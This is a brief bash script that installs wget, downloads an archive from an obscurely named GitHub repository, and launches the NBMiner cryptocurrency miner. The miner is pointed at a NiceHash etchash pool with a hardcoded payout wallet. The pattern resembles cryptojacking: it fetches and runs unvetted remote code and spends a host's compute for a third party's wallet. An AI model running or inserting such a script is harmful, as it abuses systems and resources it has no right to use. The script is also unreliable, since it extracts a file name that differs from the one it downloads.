#!/bin/bash
apt-get install wget -y
wget https://github.com/gihu22/cucum/raw/main/sundel.tgz
tar -xvf sundel.tar.gz
cd NBMiner_Linux
./nbminer -a etchash -o nicehash+tcp://etchash.auto.nicehash.com:9200 -u 3MYuuKJ78wazszEA8d3MLjKQW1tH7P6cyW.ERGO
